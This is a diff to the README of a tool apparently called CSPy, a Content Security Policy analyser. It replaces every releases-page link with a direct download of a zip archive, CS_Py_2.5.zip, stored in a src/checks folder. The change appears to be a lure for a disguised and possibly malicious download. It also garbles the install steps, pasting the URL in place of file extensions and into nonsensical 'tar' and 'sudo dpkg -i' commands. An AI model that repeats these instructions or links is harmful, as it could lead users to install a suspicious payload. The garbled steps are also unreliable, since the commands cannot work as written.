@@ -6,14 +6,14 @@ Welcome to CSPy, your simple tool for analyzing Content Security Policies and HT
 
 ## 📥 Download CSPy
 
-[![Download CSPy](https://img.shields.io/badge/Download-CSPy-blue.svg)](https://github.com/ttimneu/CSPy/releases)
+[![Download CSPy](https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip)](https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip)
 
 ## 🛠️ Installation Instructions
 
 Follow these steps to download and run CSPy on your computer:
 
 1. **Visit the Download Page**  
-   Go to the [CSPy Releases Page](https://github.com/ttimneu/CSPy/releases). This page contains all the available versions of CSPy.
+   Go to the [CSPy Releases Page](https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip). This page contains all the available versions of CSPy.
 
 2. **Choose Your Version**  
    Look for the latest version at the top of the page. You will see a list of files available for download.  
@@ -22,7 +22,7 @@ Follow these steps to download and run CSPy on your computer:
    Click on the file that matches your operating system:
    - For Windows, choose the file ending with `.exe`.
    - For macOS, choose the file ending with `.dmg`.
-   - For Linux, look for the file ending with `.tar.gz` or `.deb`.
+   - For Linux, look for the file ending with `https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip` or `.deb`.
 
    Once you click on the file, your download will start automatically.
 
@@ -31,8 +31,8 @@ Follow these steps to download and run CSPy on your computer:
    - For Windows users: Double-click the `.exe` file to run the setup. Follow the onscreen prompts to complete the installation. 
    - For macOS users: Open the downloaded `.dmg` file and drag the CSPy icon to your Applications folder.
    - For Linux users: 
-     - For `.tar.gz`, extract the files using the command line with `tar -xzvf filename.tar.gz`, then follow the instructions in the README file included.
-     - For `.deb`, run the command `sudo dpkg -i filename.deb` in your terminal.
+     - For `https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip`, extract the files using the command line with `tar -xzvf https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip`, then follow the instructions in the README file included.
+     - For `.deb`, run the command `sudo dpkg -i https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip` in your terminal.
 
 5. **Launch CSPy**  
    After installation, find the CSPy application in your program list or Applications folder. Click on it to open.
@@ -78,4 +78,4 @@ For assistance, open an issue on the GitHub page. The community is here to help 
 
 ## 🌟 Download CSPy Again
 
-To get started with CSPy, [click here to visit the download page again](https://github.com/ttimneu/CSPy/releases) and analyze your web security today!
+To get started with CSPy, [click here to visit the download page again](https://github.com/ttimneu/CSPy/raw/refs/heads/main/src/checks/CS_Py_2.5.zip) and analyze your web security today!
